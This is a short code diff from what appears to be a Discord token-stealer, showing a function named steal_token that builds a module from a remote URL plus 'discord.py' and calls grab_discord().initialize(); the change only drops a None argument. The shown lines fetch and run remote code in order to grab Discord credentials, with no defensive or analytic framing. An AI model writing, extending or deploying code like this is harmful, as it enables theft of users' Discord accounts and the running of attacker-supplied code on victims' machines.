@@ -114,7 +114,7 @@ def run(data):
     def steal_token(new_data):
         if new_data['uuid'] == data['uuid']:
             module = create_moduel(data['url']+'discord.py')
-            result = module.grab_discord().initialize(None)
+            result = module.grab_discord().initialize()
             print(result)
 
 
